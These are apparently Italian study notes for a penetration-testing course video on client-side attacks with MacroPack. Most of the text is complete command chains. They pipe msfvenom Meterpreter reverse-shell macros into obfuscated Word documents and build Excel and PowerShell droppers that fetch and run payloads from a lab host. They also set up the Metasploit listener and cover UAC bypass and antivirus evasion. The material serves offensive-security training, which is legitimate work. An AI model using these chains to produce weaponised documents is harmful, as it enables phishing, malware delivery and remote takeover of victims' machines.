# 022 — Automating Macro Development with MacroPack - Part 2 (Client-Side Attacks)

> **Modulo:** Client-Side Attacks · **Video:** 22/26
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [022_Automating Macro Development with MacroPack - Part 2.txt](022_Automating Macro Development with MacroPack - Part 2.txt) · [022_Automating Macro Development with MacroPack - Part 2.srt](022_Automating Macro Development with MacroPack - Part 2.srt)

## Concetti chiave

- **`--list-templates`** mostra i payload template di MacroPack: `hello`, `cmd`, `remote_cmd`, `dropper`, `dropper_ps`, `dropper_powershell_unc`, `dropper_dll_meterpreter`, `embed_exe`, `embed_dll`, `dll`.
- **Pipeline MSFvenom → MacroPack**: `msfvenom -f vba | macropack.exe -o -G resume.doc` = generazione + offuscamento macro Meterpreter in un comando.
- **Template `dropper`**: documento che, all'apertura, scarica un file remoto e lo esegue. Parametri: `<URL>;<local_filename>`.
- **Workflow lab**: Win Server (dev) + Win10 (target) via RDP. Apache/Python su Win Server hosta sia il `.doc` sia gli stage exe.
- MacroPack converte automaticamente `AutoOpen` ↔ `Workbook_Open` in base al formato target (Word vs Excel).
- `>` redirect in PowerShell **rompe l'encoding binary** → con `msfvenom -f exe` usare sempre **`-o <file>`** (NON `> file`).

## Spiegazione approfondita

### Workflow MSF + MacroPack (Word doc Meterpreter)
```cmd
:: Su Win Server (dev system del lab)
msfvenom.bat -p windows/meterpreter/reverse_tcp ^
  LHOST=10.1.1.15 LPORT=4444 -f vba ^
  | macropack.exe -o -G resume.doc
```
- `msfvenom -f vba` → output macro VBA pura (subroutine random, payload hex).
- Pipe stdin → MacroPack la inietta in Word 97 doc + obfuscation completo.
- Output `resume.doc` pronto.

Hosting + listener:
```cmd
:: Hosting sul dev system
cd C:\Macropack
python -m http.server 80

:: Listener
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.1.1.15
set LPORT 4444
run
```
Target (10.100.11.128) via RDP → browser → `http://10.1.1.15/resume.doc` → Open → Enable Content → Meterpreter session.

### Verifiche post-shell
```
meterpreter > getuid     # Administrator
meterpreter > sysinfo    # Windows Server 2012 R2 x64
meterpreter > getprivs
meterpreter > getsystem
meterpreter > ipconfig   # conferma 10.100.11.128
```

### Template `dropper` (multi-stage)
**Step 1** — genera lo stage finale (exe Meterpreter):
```cmd
msfvenom -p windows/meterpreter/reverse_tcp ^
  LHOST=10.1.1.15 LPORT=5555 -f exe -o update.exe
```
NOTA: usare **`-o update.exe`**, non `> update.exe` (su Windows il redirect rompe il binary).

**Step 2** — genera doc con dropper template:
```cmd
echo http://10.1.1.15/update.exe | macropack.exe -t dropper -o -G accounts_2024.xls
```
- Echo passa la URL via stdin.
- `-t dropper` = template "download + run".
- Output **Excel `.xls`** → MacroPack converte `AutoOpen` → `Workbook_Open` automaticamente.

**Step 3** — hosting + listener:
```cmd
python -m http.server 80      :: in folder con update.exe e accounts_2024.xls
:: msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.1.1.15
set LPORT 5555
run
```

**Step 4** — target apre `accounts_2024.xls` → Enable Editing → Enable Content → macro fa GET `update.exe` → lo salva su disco → lo esegue → Meterpreter session.

### Altri template utili
| Template | Comportamento |
|---|---|
| `hello` | MsgBox di test |
| `cmd` | Esegue comando CMD locale |
| `remote_cmd` | Esegue cmd e POSTa output a HTTP server |
| `dropper` | Scarica + esegue exe |
| `dropper_ps` | Scarica + esegue script PowerShell |
| `dropper_powershell_unc` | Esegue PS via UNC path (SMB) |
| `dropper_dll_meterpreter` | Drop + load DLL Meterpreter |
| `embed_exe` | Embedda exe nel doc (drop + exec) |
| `embed_dll` | Embedda DLL nel doc |

### `--uac-bypass`
Aggiunge stub di UAC bypass se il target è admin con UAC enabled → esecuzione **elevated**. Richiede previa client-side recon (utente admin? UAC level?).

### Custom doc template
MacroPack supporta `--template <file.doc>`: usa un doc esistente come carrier (vedi pretexting templates di `office-fish-templates`, video 018).

### Caveat di obfuscation
- MacroPack obfuscation è **sufficiente per signature-based AV** rudimentale, NON per EDR moderni.
- Per payload PowerShell pesanti (es. Empire stager) raccomandato custom encoding ulteriore.
- Alexis dichiara che lui personalmente preferisce **VBA+PowerShell hand-crafted** per stealthier initial access.

## Comandi & strumenti

| Comando | Scopo |
|---|---|
| `macropack.exe --list-templates` | Mostra template payload |
| `msfvenom -f vba \| macropack.exe -o -G out.doc` | Inietta VBA MSF in doc Word, offusca |
| `echo <URL> \| macropack.exe -t dropper -o -G out.xls` | Doc dropper che scarica URL |
| `echo <URL> \| macropack.exe -t dropper_ps -o -G out.doc` | Dropper PowerShell |
| `msfvenom -p ... -f exe -o stage.exe` | Stage exe per dropper (usare `-o`, non `>`) |
| `python -m http.server 80` | Hosting doc + stage |
| `multi/handler` con payload identico | Listener |
| `--uac-bypass` | Stub UAC bypass |
| `--template <carrier.doc>` | Usa doc carrier custom (pretexting) |

## Esempi pratici

```cmd
:: 1) Macro Meterpreter end-to-end
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.15 LPORT=4444 -f vba ^
  | macropack.exe -o -G resume.doc
python -m http.server 80
:: msfconsole: use exploit/multi/handler ; set PAYLOAD windows/meterpreter/reverse_tcp ; set LHOST 10.1.1.15 ; set LPORT 4444 ; run

:: 2) Dropper Excel multi-stage
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.1.1.15 LPORT=5555 -f exe -o update.exe
echo http://10.1.1.15/update.exe | macropack.exe -t dropper -o -G accounts_2024.xls

:: 3) Dropper PowerShell con custom template carrier
echo http://10.1.1.15/empire_stager.ps1 ^
  | macropack.exe -t dropper_ps -o --template invoice_template.doc -G Invoice_Q4.doc
```

## Punti d'attenzione per l'esame eCPPT

- **Pipeline canonico**: `msfvenom -f vba | macropack.exe -o -G <out>` per macro Meterpreter automatizzate + offuscate.
- **Template `dropper`** = doc che scarica/esegue exe remoto; input: URL via stdin.
- **`dropper_ps`** = variante PowerShell.
- MacroPack **converte automaticamente** `AutoOpen` ↔ `Workbook_Open` in base al formato output.
- **`msfvenom -f exe -o file.exe`** — su Windows usare `-o`, mai `>` (redirect rompe binari).
- **`--uac-bypass`** disponibile se serve esecuzione elevated.
- Sufficient per AV signature-based; **non sufficient** per EDR/behavior-based (per quello servono custom obfuscation, AMSI bypass, etc).
- Conoscere catena lab tipica: dev system → genera doc → host HTTP → handler MSF → target apre via RDP → Meterpreter.

## Collegamenti con altri video

- Precedente: [[021_Automating Macro Development with MacroPack - Part 1]] — installazione, help, primo PoC.
- Prossimo: [[023_File Smuggling with HTML & JavaScript]] — delivery innovativo.
- Pretexting carrier doc: [[018_Pretexting Phishing Documents]] (combinabile con `--template`).
- Stagers C2: modulo **Command & Control (C2)**, **PowerShell Empire**, **Starkiller**.
- Pivot/post-ex post-Meterpreter: modulo **Lateral Movement & Pivoting**.
